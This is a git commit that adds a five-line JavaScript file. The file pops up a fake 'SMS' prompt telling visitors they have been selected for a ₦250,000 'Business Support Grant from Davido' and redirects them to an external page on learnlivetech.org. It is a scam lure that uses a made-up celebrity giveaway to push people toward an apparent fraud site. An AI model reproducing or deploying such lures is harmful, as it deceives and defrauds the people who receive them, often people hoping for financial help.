4057af2ebf528e944f462ad49059243ac933d789
bigukpe <bigaka42@gmail.com>
2025-05-28 07:33:29 +0100

    Create davido-active.js

---
+++ davido-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦250,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦250,000 Business Support Grant from Davido, Press Ok to withdraw cash Now ','WITHDRAW ₦250,000');
+if (password != 'WITHDRAW ₦250,000') {
+location.href='https://learnlivetech.org/davido.html';
+}
